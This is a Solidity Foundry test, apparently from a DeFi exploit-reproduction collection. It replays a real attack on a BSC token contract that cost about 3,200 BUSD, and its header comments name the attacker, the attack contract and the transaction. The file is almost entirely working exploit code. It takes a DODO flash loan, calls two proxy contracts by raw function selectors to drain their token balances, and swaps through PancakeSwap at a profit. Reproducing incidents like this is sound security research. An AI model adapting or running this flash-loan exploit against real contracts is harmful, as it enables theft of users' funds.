// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~3200 $BUSD
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0xb2f22296661ccc5530ebdbabb8264b82e977504d
// Vulnerable Contract : https://bscscan.com/address/0x37177ccc66ef919894cef37596bbebd76e7a40b2
// Attack Tx : https://bscscan.com/tx/0x6ba4152db9da45f5751f2c083bf77d4b3385373d5660c51fe2e4382718afd9b4

import "forge-std/Test.sol";
import "./../interface.sol";

interface IPorxy3717 {}

interface IPorxye38d {}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 CCV = IERC20(0x89c27D81941708dBC9AA4d905443392cb4A8EF73);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPorxy3717 proxy3717 = IPorxy3717(0x37177ccC66ef919894CeF37596BBebd76E7A40B2);
    IPorxye38d proxye38d = IPorxye38d(0xE38d7ff85bB801D35382eeF15eB8263F2c751ecd);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced DODO = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);


    function setUp() public {
        vm.createSelectFork("bsc", 34739874 - 1);
        vm.label(address(proxy3717), "proxy3717");
        vm.label(address(proxye38d), "proxye38d");
    }

    function testExploit() public {
        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));
        emit log_named_uint("Attacker BUSD balance before attack:", BUSD.balanceOf(address(this)));
        CCV.approve(address(Router), type(uint256).max);
        BUSD.approve(address(Router), type(uint256).max);
        DODO.flashLoan(0, 100000 * 1e18, address(this), new bytes(1));
        emit log_named_uint("Attacker BUSD balance before attack:", BUSD.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(msg.sender == address(DODO), "Fail");
        (bool success1,) =
            address(proxy3717).call(abi.encodeWithSelector(bytes4(0x369baafe), CCV.balanceOf(address(proxy3717))));
        BUSDTOTOKEN();
        (bool success2,) =
            address(proxye38d).call(abi.encodeWithSelector(bytes4(0xb7da6a49), BUSD.balanceOf(address(proxye38d))));
        TOKENTOBUSD();
        
        BUSD.transfer(address(DODO), 100000 * 1e18);
    }

    function BUSDTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(CCV);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function TOKENTOBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(CCV);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            CCV.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
